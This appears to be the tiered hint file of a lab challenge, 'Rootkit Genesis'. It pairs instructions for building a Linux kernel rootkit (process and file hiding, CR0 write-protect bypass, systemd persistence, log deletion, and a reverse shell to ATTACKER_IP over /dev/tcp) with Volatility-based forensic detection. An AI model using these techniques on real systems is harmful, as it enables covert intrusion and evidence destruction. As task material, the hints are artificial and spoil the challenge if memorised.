# Rootkit Genesis — Hints

> Each tier costs score points. Only request a hint when you are genuinely stuck.

---

## Tier 1 — Conceptual Direction (-5% score penalty)

**Part A:** A kernel rootkit gains its stealth by intercepting the kernel interfaces that user-space tools rely on to enumerate system state. Process hiding works by removing the target process from the linked list that `/proc` iterates over. File hiding works by wrapping the VFS `iterate_shared` operation so certain directory entries are silently skipped. Persistence works by embedding a loader into a file that runs at boot time (init scripts, systemd units, or a bootloader hook). Anti-forensics works by erasing evidence of your actions from logs, timestamps, and memory.

**Part B:** Rootkits must leave traces — they cannot hide from everything simultaneously. A well-equipped forensic analyst compares observations from multiple vantage points: a clean OS (what processes and modules *should* exist), a memory dump (what processes and modules *actually* exist at a lower level), and network traffic (what the machine is actually communicating). Discrepancies between these views reveal the rootkit.

---

## Tier 2 — Technique Guidance (-10% score penalty)

**Part A:**
- **Process hiding**: Hook the `filldir`/`iterate_shared` callback of the `/proc` filesystem VFS operations to skip entries matching your target PID prefix. Alternatively, unlink the process's `task_struct` from the `init_task` doubly-linked list using `list_del_init`.
- **File hiding**: Override `iterate_shared` in the target directory's `file_operations` to skip entries whose names match your hidden file pattern.
- **Reverse shell**: Use `call_usermodehelper()` from kernel space to launch a user-space reverse shell script; use a kernel timer (`timer_setup` + `mod_timer`) for the 60-second reconnect loop.
- **Persistence**: Add a `@reboot` cron entry or a systemd unit in `/etc/systemd/system/` that reloads the module. Alternatively patch an init script.
- **Anti-forensics**: Use `do_unlinkat()` or a user-mode helper to delete log entries matching your activity timestamp. Use `vfs_utimes()` to stomp file modification times.

**Part B:**
- Use **Volatility3** with a Linux profile to enumerate processes from the raw memory dump (`linux.pslist` vs `linux.psscan` — discrepancies reveal hidden PIDs). Use `linux.lsmod` to find hidden kernel modules.
- Use `ss -antp` from a **statically compiled busybox** (bypasses any hooked libc/procfs) to find established network connections that `/proc/net/tcp` hides.
- Cross-reference `crontab -l`, `/etc/cron.*`, and `systemctl list-units` for persistence artifacts.

---

## Tier 3 — Implementation Guidance (-15% score penalty)

**Part A — Step-by-step implementation order:**
1. Scaffold a basic loadable kernel module (LKM): `module_init`, `module_exit`, `MODULE_LICENSE("GPL")`, `MODULE_VERSION`. Confirm it loads/unloads cleanly with `insmod`/`rmmod`.
2. Obtain `kallsyms_lookup_name` on kernel >= 5.7 via the kprobes trick: register a kprobe with symbol name `"kallsyms_lookup_name"`, read `kp.addr`, unregister — now you have the function pointer.
3. Disable write protection on the page containing the syscall table: save `cr0`, clear bit 16 with `write_cr0(read_cr0() & ~0x10000UL)`, perform your hook, restore `cr0`.
4. For process hiding: save the original `proc_root->proc_fops->iterate_shared`, install a replacement that calls the original but then walks the `buf->filp` buffer removing matching entries.
5. For the reverse shell timer: in the timer callback call `call_usermodehelper("/bin/bash", argv, envp, UMH_NO_WAIT)` where argv contains `["/bin/bash", "-c", "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1", NULL]`.
6. For reboot persistence: write a systemd unit file via a user-mode helper during `module_init`: `Type=simple`, `ExecStart=/sbin/insmod /path/to/rootkit.ko`, `WantedBy=multi-user.target`.

**Part B — Forensics methodology:**
1. Take a memory dump of the live compromised VM first (before anything changes): `sudo avml /tmp/mem.lime` or use `LiME` kernel module.
2. Run Volatility3: `vol -f mem.lime linux.pslist > pslist.txt` and `vol -f mem.lime linux.psscan > psscan.txt`; diff the two files — PIDs in psscan but not pslist are hidden.
3. Run `vol -f mem.lime linux.lsmod` and compare with `/proc/modules` on the live system — hidden modules appear only in the Volatility output.
4. Extract network state: `vol -f mem.lime linux.netstat` to find connections that a hooked `/proc/net/tcp` hides.
5. For the C2 address: look for `ESTABLISHED` connections to non-RFC-1918 IPs; resolve via `whois`; check the binary dropped by the rootkit for hardcoded IPs using `strings | grep -E '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+'`.
6. Build the timeline by correlating: filesystem `mtime`/`ctime` (use `debugfs` or `The Sleuth Kit` to bypass a hooked VFS), `/var/log/auth.log`, bash history, and journal logs — even if partially deleted, timestamps in journal binary format survive.
